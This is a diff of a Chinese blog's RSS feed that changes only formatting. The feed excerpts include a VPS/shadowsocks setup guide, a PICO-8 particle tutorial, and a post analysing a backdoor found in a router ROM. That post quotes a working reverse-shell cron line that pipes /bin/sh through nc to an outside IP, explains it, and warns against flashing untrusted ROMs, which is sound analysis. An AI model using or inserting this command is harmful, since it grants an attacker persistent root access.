@@ -6,7 +6,6 @@
     <description>Recent content in Posts on </description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <copyright>ب_ب</copyright>
     <lastBuildDate>Sun, 15 Oct 2017 00:00:00 +0000</lastBuildDate>
     
 	<atom:link href="https://geekorz.com/post/index.xml" rel="self" type="application/rss+xml" />
@@ -34,7 +33,8 @@
 点击Manage进入管理页面。复制里面的Ip Address和Password，这是我们登陆服务器所需要的信息。  至此VPS部署完成：）
  0x02 部署shadowsocks服务端  使用ssh工具登陆服务器
  工具选择：
- windows推荐使用putty mac/linux可以直接使用终端输入命令即可登陆  ssh root@这里填写你的服务器地址  在提示输入密码的时候黏贴你复制的密码然后回车即可（PS：mac和linux在输入密码的时候是不会像windows一样有****提示密码位数的）
+ windows推荐使用putty mac/linux可以直接使用终端输入命令即可登陆
+ssh root@这里填写你的服务器地址   在提示输入密码的时候黏贴你复制的密码然后回车即可（PS：mac和linux在输入密码的时候是不会像windows一样有****提示密码位数的）
 登陆后能看到如下信息
 Welcome to Ubuntu 17.10 (GNU/Linux 4.13.0-16-generic x86_64) * Documentation: https://help.</description>
     </item>
@@ -63,7 +63,8 @@ function dr_image() for i=0, 15 do local x = i * 8 rectfill(x, 40, x+8, 48, i) l
       <description>什么是粒子系统 Particle system 粒子系统组成：
  发射器 发射速度 初始速度 颜色 发射速率 etc  简单的死亡爆炸特效  生成一圈小圆点，然后向外扩散，形成一个简单的爆炸效果
  单个粒子生成方法 每个粒子拥有的属性：
- 当前的位置信息：x,y 粒子的sprite信息：frame 粒子的颜色：col 生存时间信息：t, max_t 速度信息：dx, dy 加速度信息：ddy  function make_sparkle(x,y,frame,col) local s = {} s.x=x s.y=y s.frame=frame s.col=col s.t=0 s.max_t = 8+rnd(4) s.dx = 0 s.dy = 0 s.ddy = 0 add(sparkle,s) return s end  粒子是怎么运动的？ 粒子的运动遵循基础的物理定律(注意不是精确的，但在此使用足矣)。
+ 当前的位置信息：x,y 粒子的sprite信息：frame 粒子的颜色：col 生存时间信息：t, max_t 速度信息：dx, dy 加速度信息：ddy
+function make_sparkle(x,y,frame,col) local s = {} s.x=x s.y=y s.frame=frame s.col=col s.t=0 s.max_t = 8+rnd(4) s.dx = 0 s.dy = 0 s.ddy = 0 add(sparkle,s) return s end   粒子是怎么运动的？ 粒子的运动遵循基础的物理定律(注意不是精确的，但在此使用足矣)。
 function move_sparkle(sp) if (sp.t &amp;gt; sp.max_t) then	--当粒子的到达自己的寿命的时候将被删除 del(sparkle,sp) end sp.x = sp.</description>
     </item>
     
@@ -85,7 +86,10 @@ function move_sparkle(sp) if (sp.t &amp;gt; sp.max_t) then	--当粒子的到达�
 额，此nc非彼nc， nc全名netcat是一个功能非常强大的网络工具，从man说明中：
 and much， much more嗯， 霸气侧漏的描述。
 在50行中，nc连接到了45.32.253.23端口1082。查了下ip发现是日本的一个服务器。
-庖丁解牛 echo &#39;*/1 * * * * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 45.32.253.23 1082 &amp;gt;/tmp/f&#39; &amp;gt;&amp;gt; /etc/crontabs/root   由外而内地看，这行代码是echo了一个字符串，然后把它附加到了/etc/crontabs/root文件的末尾，而这个文件正是root用户的定时执行任务列表， */1 * * * *表示每隔一分钟执行一次。 每次执行什么命令呢 简单来说就是通过mkfifo命令创建一条命名管道/tmp/f，然后用cat读取管道中的内容，并使用/bin/sh执行， 并将执行结果通过nc发送到45.32.253.23的1082端口，并将从nc接收到的命令通过命名管道f将和cat再送到/bin/sh执行。相当于创造了一条从远程执行shell命令的通道。而且属于反向链接，可以穿透nat。  2&amp;gt;&amp;amp;1   表示将stderr重定向到stdout &amp;amp;表示等同于，即2的输出重定向并等同于1   管道命令只处理前一个命令正确输出，不处理错误输出 管道命令右边命令，必须能够接收标准输入流命令才行。 管道触发两个子进程执行&amp;rdquo;|&amp;ldquo;两边的程序；而重定向是在一个进程内执行  我们将地址改为localhost测试一下这个命令，果然直接拿到了路由器的root权限的shell：
+庖丁解牛 echo &#39;*/1 * * * * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 45.32.253.23 1082 &amp;gt;/tmp/f&#39; &amp;gt;&amp;gt; /etc/crontabs/root   由外而内地看，这行代码是echo了一个字符串，然后把它附加到了/etc/crontabs/root文件的末尾，而这个文件正是root用户的定时执行任务列表， */1 * * * *表示每隔一分钟执行一次。 每次执行什么命令呢 简单来说就是通过mkfifo命令创建一条命名管道/tmp/f，然后用cat读取管道中的内容，并使用/bin/sh执行， 并将执行结果通过nc发送到45.32.253.23的1082端口，并将从nc接收到的命令通过命名管道f将和cat再送到/bin/sh执行。相当于创造了一条从远程执行shell命令的通道。而且属于反向链接，可以穿透nat。
+2&amp;gt;&amp;amp;1  表示将stderr重定向到stdout
+ &amp;amp;表示等同于，即2的输出重定向并等同于1
+   管道命令只处理前一个命令正确输出，不处理错误输出 管道命令右边命令，必须能够接收标准输入流命令才行。 管道触发两个子进程执行&amp;rdquo;|&amp;ldquo;两边的程序；而重定向是在一个进程内执行  我们将地址改为localhost测试一下这个命令，果然直接拿到了路由器的root权限的shell：
 后记
 千万不要执行来路不明的代码，刷来路不明的rom。
 参考：</description>
